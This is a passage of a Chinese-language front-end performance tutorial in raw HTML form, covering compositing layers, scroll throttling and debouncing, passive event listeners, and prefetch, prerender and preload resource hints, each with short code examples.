url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAwklEQVQI1wG3AEj/APvx2Pbhq/fktPfksvjls93Q6M/C9NPH8tXK8tDD8dHD9NLO6MHdub/buMTevcPdvb/at8Dbub3attfo0wD23aDtvUPuyGPtxF70xUO3lLCXfO2ZfOCZfeSZfeKdf+WUgNd1r2l0smRwr2FysWR1smd8tW1vrmCeyJQA+u/U9d2j9eCs9d+p9+Kq2MrkybrzzsDx0cTxzL7wzb3zzsnoutixttauvtq3vdm2t9awutizttWu0+fPJDKHP6AFq1oAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 23 00 54 45" title="" data-src="/static/2021-07-23-00-54-45-46e23a114177a5ebd5fe81223b1e351c-fee1c.png" data-srcset="/static/2021-07-23-00-54-45-46e23a114177a5ebd5fe81223b1e351c-a67b7.png 200w,\n/static/2021-07-23-00-54-45-46e23a114177a5ebd5fe81223b1e351c-0b187.png 400w,\n/static/2021-07-23-00-54-45-46e23a114177a5ebd5fe81223b1e351c-fee1c.png 800w,\n/static/2021-07-23-00-54-45-46e23a114177a5ebd5fe81223b1e351c-5fff1.png 1093w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>由于之前我们说到，元素布局可能会影响到整个页面，那么自然我们就会想，是否能尽可能减少影响的范围呢？在某些情况下是可以的。例如下面这两个元素：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="92158601898985960000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`.main {\n  height: 200px;\n  width: 200px;\n  background: black;\n}\n\n.fixed {\n  position: fixed;\n  top: 20px;\n  left: 20px;\n  transform: translateZ(0);\n  width: 100px;\n  height: 100px;\n  background: red;\n}`, `92158601898985960000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="css"\n              >\n                <span class="gatsby-code-button-language">css</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.main</span> <span class="token punctuation">{</span>\n  <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>\n  <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>\n  <span class="token property">background</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n\n<span class="token selector">.fixed</span> <span class="token punctuation">{</span>\n  <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>\n  <span class="token property">top</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>\n  <span class="token property">left</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>\n  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateZ</span><span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>\n  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>\n  <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="9541919211281203000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<div class=&quot;main&quot;></div>\n<div class=&quot;fixed&quot;></div>`, `9541919211281203000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fixed<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>\n<p>浏览器会将其处理为两个渲染层，其中 .fixed 元素由于设置了 3D transform，所以会从普通的渲染层提升至合成层，拥有独立的 GraphicsLayers。当合成层更新时，浏览器会将布局调整限制在该层中，做到尽可能小的布局变动。下图展示了当前的两个合成层：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-23-00-56-07-4c0d10b80dda0b0d1c239957dfce1e40-2e26b.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 26.277372262773724%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsSAAALEgHS3X78AAAAtUlEQVQY02O4dvr0pRMnHly79uzWzVePH79+8+bN23fvP37+8OHDu3fv3r8DgefvP3z5/v0HEKECho9v3rx7+QJIfn775svHj5+/AJV9/w8G//7+BZKPbty4lxqV7Gi3cccOIPfPnz//YYABqPrL169AEoQ+f/706dO3b98gcn/B6s4eOdzCwyTEwDBl1iwg9/fv30iaUQGKZrDNV69ds3X3sLV32LtnD4bNuDVDHf/v338cAAD1wBB229SsggAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 23 00 56 07" title="" data-src="/static/2021-07-23-00-56-07-4c0d10b80dda0b0d1c239957dfce1e40-fee1c.png" data-srcset="/static/2021-07-23-00-56-07-4c0d10b80dda0b0d1c239957dfce1e40-a67b7.png 200w,\n/static/2021-07-23-00-56-07-4c0d10b80dda0b0d1c239957dfce1e40-0b187.png 400w,\n/static/2021-07-23-00-56-07-4c0d10b80dda0b0d1c239957dfce1e40-fee1c.png 800w,\n/static/2021-07-23-00-56-07-4c0d10b80dda0b0d1c239957dfce1e40-b1a91.png 1200w,\n/static/2021-07-23-00-56-07-4c0d10b80dda0b0d1c239957dfce1e40-95179.png 1600w,\n/static/2021-07-23-00-56-07-4c0d10b80dda0b0d1c239957dfce1e40-2e26b.png 1644w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>总得来说，合成层在性能优化上的优点在于：</p>\n<ul>\n<li>合成层的位图，会交由 GPU 合成，比 CPU 处理要快；</li>\n<li>当需要 repaint 时，只需要 repaint 本身，不会影响到其他的层；</li>\n<li>对于 transform 和 opacity 效果，不会触发 layout 和 paint。</li>\n</ul>\n<p>但同时，也要注意避免层爆炸，防止在无法进行层压缩的情况下出现过多的层，反而导致性能的下降。这篇文章介绍了 <a href="https://fed.taobao.org/blog/2016/04/26/performance-composite/" target="_blank" rel="nofollow noreferrer noopener">composite 的原理及其相关应用</a>。</p>\n<h2 id="滚动事件的性能优化"><a href="#%E6%BB%9A%E5%8A%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>滚动事件的性能优化</h2>\n<p>前端最容易碰到的性能问题的场景之一就是监听滚动事件并进行相应的操作。由于滚动事件发生非常频繁（相较于用户点击、hover 等事件），所以频繁地执行监听回调就容易造成 JavaScript 执行与页面渲染之间互相阻塞的情况。</p>\n<p>滚动的性能优化其实也是一种综合性的优化。它主要是会将上述的各类性能问题放大了，所以在优化措施中，你仍然需要避免出现上面提到的长时间的 JavaScript 执行、强制同步布局等问题。</p>\n<p>此外，基于滚动这个特殊场景，这里再介绍两个处理滚动性能时非常常见的技术：防抖和节流。</p>\n<p>当一个事件频繁触发，而你希望间隔一定的时间再触发相应的函数时就会使用节流（throttle）。例如在页面滚动时，每 200ms 进行一次页面背景颜色的修改。</p>\n<p>当一个事件频繁触发，而你希望在事件触发结束一段时间后（此段时间内不再有触发）才实际触发响应函数时会使用防抖（debounce）。例如用户一直点击按钮，但你不希望频繁发送请求，你就可以设置当点击后 200ms 内用户不再点击时才发送请求。</p>\n<p>这两个技术也是前端非常常用的技术，例如 lodash 中就有 throttle 和 debounce 的对应实现。</p>\n<h2 id="passive-event-listeners"><a href="#passive-event-listeners" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Passive event listeners</h2>\n<p>在介绍 Passive event listeners 是如何让滚动更顺畅之前，我们先来看下为什么会有 Passive event listeners。</p>\n<p>考虑下面这段代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="86924574552049780000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`document.addEventListener(\n  \'touchstart\',\n  function(e) {\n    // 做了一些操作……\n    e.preventDefault();\n  },\n  true\n);`, `86924574552049780000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>\n  <span class="token string">\'touchstart\'</span><span class="token punctuation">,</span>\n  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token comment">// 做了一些操作……</span>\n    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span><span class="token punctuation">,</span>\n  <span class="token boolean">true</span>\n<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>我们知道，在 touchstart 中调用了 e.preventDefault() 会阻止页面的滚动与缩放。那么浏览器是如何知道不要让页面滚动与缩放的呢？当然是因为我们调用了 e.preventDefault()，你可能认为这是废话，不过问题就在这。如果浏览器不执行完监听回调里的代码，就不会知道开发者有没有禁止默认事件。所以不管你是否调用了 e.preventDefault()，当你添加触摸、滚轮的事件监听后，每次触发该事件，浏览器都会先花费事件执行完你的回调，然后根据结果来判断是否需要滚动页面。如果的操作花费了 200ms，那页面只能在 200ms 后再滚动或缩放，这就导致了性能问题。</p>\n<p>那你肯定会想，很多时候我不会阻止默认事件呀，我有没有办法告诉浏览器，让它不用等啦（默认行为没有被禁用），直接滚动页面就行呢？Passive event listeners 就是为此而生的。使用方式很简单：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="95093939432317570000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`document.addEventListener(\n  \'touchstart\',\n  function(e) {\n    // 做了一些操作……\n  },\n  { passive: true }\n);`, `95093939432317570000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>\n  <span class="token string">\'touchstart\'</span><span class="token punctuation">,</span>\n  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token comment">// 做了一些操作……</span>\n  <span class="token punctuation">}</span><span class="token punctuation">,</span>\n  <span class="token punctuation">{</span> passive<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span>\n<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>只需要在第三个参数中传入 {passive: true} 即可。</p>\n<p>然而和其他新特性一样，对于 Passive event listeners 我们也需要考虑兼容性。由于在低版本浏览器中，第三个参数是用来设置是否进行事件捕获的。所以使用时建议进行特性检测：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="36139927448256758000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// 这段特性检测的方法很巧妙，检测是否被使用\nlet supportsPassive = false;\ntry {\n  const opts = Object.defineProperty({}, \'passive\', {\n    get: function() {\n      supportsPassive = true;\n    }\n  });\n  window.addEventListener(\'testPassive\', null, opts);\n  window.removeEventListener(\'testPassive\', null, opts);\n} catch (e) {}\n\ndocument.addEventListener(\n  \'touchstart\',\n  function(e) {\n    // 做了一些操作……\n  },\n  supportsPassive ? { passive: true } : false\n);`, `36139927448256758000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// 这段特性检测的方法很巧妙，检测是否被使用</span>\n<span class="token keyword">let</span> supportsPassive <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>\n<span class="token keyword">try</span> <span class="token punctuation">{</span>\n  <span class="token keyword">const</span> opts <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">\'passive\'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>\n    <span class="token function-variable function">get</span><span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n      supportsPassive <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">\'testPassive\'</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>\n  window<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">\'testPassive\'</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>\n\ndocument<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>\n  <span class="token string">\'touchstart\'</span><span class="token punctuation">,</span>\n  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token comment">// 做了一些操作……</span>\n  <span class="token punctuation">}</span><span class="token punctuation">,</span>\n  supportsPassive <span class="token operator">?</span> <span class="token punctuation">{</span> passive<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span> <span class="token punctuation">:</span> <span class="token boolean">false</span>\n<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这个<a href="https://www.youtube.com/watch?v=NPM6172J22g" target="_blank" rel="nofollow noreferrer noopener">视频</a>展示了 Passive event listeners 带来的性能与体验提升，视频中右侧画面是使用了 Passive event listeners 的效果。</p>\n<p>运行时性能是前端性能优化中非常重要的一块。这篇文章里列举了常见场景下的通用优化手段。此外，目前大多数应用都是构建在 React/Vue/Angular 之上（当然也有 jQuery），针对具体框架的性能优化又会是好几个新的话题，后续如果有机会也希望能将它们补充进来。</p>\n<p>不过，不管什么框架在前端最终都会运行在浏览器上、使用 JavaScript 引擎（至少目前是），所以这些针对以这些通用性的性能优化思路作为基础，可以帮你更好理解与处理遇到的性能问题。</p>\n<h1 id="预加载"><a href="#%E9%A2%84%E5%8A%A0%E8%BD%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>预加载</h1>\n<p>之前我们提到了很多关于资源加载的优化，包括怎么加快连接的建立、怎么减少包体大小、怎么减少请求数等。但还有一种变相加快加载速度的技术 —— 预加载。</p>\n<p>预加载相当于是快用户一步，在空闲的时候就把用户即将用到的资源加载完，等用户实际需要使用时，资源已经存在在本地，自然就跳过了整个加载的等待时间。</p>\n<p>这里会介绍一些预加载技术，包括使用浏览器提供的能力，或者巧用 JavaScript 中的相关 API。此外，除了预加载技术，预加载的一大核心问题还在于预加载策略，即如何判断资源是否需要预加载以及是否合适加载，以保证最高的效率。</p>\n<h2 id="预加载技术"><a href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E6%8A%80%E6%9C%AF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>预加载技术</h2>\n<h3 id="resource-hints"><a href="#resource-hints" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Resource Hints</h3>\n<p>Resource Hints 是一种预加载相关的标准，它告诉浏览器哪些源下的资源我们的 Web 应用需要获取，哪些资源在之后的操作或浏览时需要被使用，从而让浏览器能够进行一些预先连接或预先加载操作。Resource Hints 标准包括 DNS Prefetch、Preconnect、Prefetch 与 Prerender。此外，还有一个与 Resource Hints 类似的 Preload 我们也会在这里介绍一下。</p>\n<p>在发起请求部分我们已经介绍了如何使用 DNS Prefetch 来预解析 DNS、如何使用 Preconnect 来预先建立连接。所以下面会介绍其他三块：Prefetch、Prerender、Preload。</p>\n<h4 id="prefetch"><a href="#prefetch" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Prefetch</h4>\n<p>你可以把 Prefetch 理解为资源预获取。一般来说，可以用 Prefetch 来指定在紧接着之后的操作或浏览中需要使用到的资源，让浏览器提前获取。由于仅仅是提前获取资源，因此浏览器不会对资源进行预处理，并且像 CSS 样式表、JavaScript 脚本这样的资源是不会自动执行并应用于当前文档的。其中 as 属性用于指定资源的类型，与 Preload 规范一致，基本涵盖了所有资源类型。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="57522873151826895000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;prefetch&quot; href=&quot;/prefetch.js&quot; as=&quot;script&quot; />`, `57522873151826895000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prefetch<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/prefetch.js<span class="token punctuation">"</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<h4 id="prerender"><a href="#prerender" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Prerender</h4>\n<p>Prerender 比 Prefetch 更进一步，可以粗略地理解不仅会预获取，还会预执行。</p>\n<blockquote>\n<p>The prerender link relation type is used to identify a resource that might be required by the next navigation, and that the user agent SHOULD fetch and execute.</p>\n</blockquote>\n<p>如果你指定 Prerender 一个页面，那么它依赖的其他资源，像 <code class="language-text">&lt;script&gt;</code>、<code class="language-text">&lt;link&gt;</code> 等页面所需资源也可能会被下载与处理。但是预处理会基于当前机器、网络情况的不同而被不同程度地推迟。例如，会根据 CPU、GPU 和内存的使用情况，以及请求操作的幂等性而选择不同的策略或阻止该操作。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="34709335959853216000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;prerender&quot; href=&quot;//sample.com/nextpage.html&quot; />`, `34709335959853216000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prerender<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//sample.com/nextpage.html<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<h4 id="preload"><a href="#preload" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Preload</h4>\n<p>在遇到需要 Preload 的资源时，浏览器会立刻进行预获取，并将结果放在内存中，资源的获取不会影响页面 parse 与 load 事件的触发。直到再次遇到该资源的使用标签时，才会执行。由于我们会将 <code class="language-text">&lt;script&gt;</code> 标签置于 <code class="language-text">&lt;body&gt;</code> 底部来保证性能，因此可以考虑在 <code class="language-text">&lt;head&gt;</code> 标签中适当添加这些资源的 Preload 来加速页面的加载与渲染。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="71422433634212480000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;preload&quot; 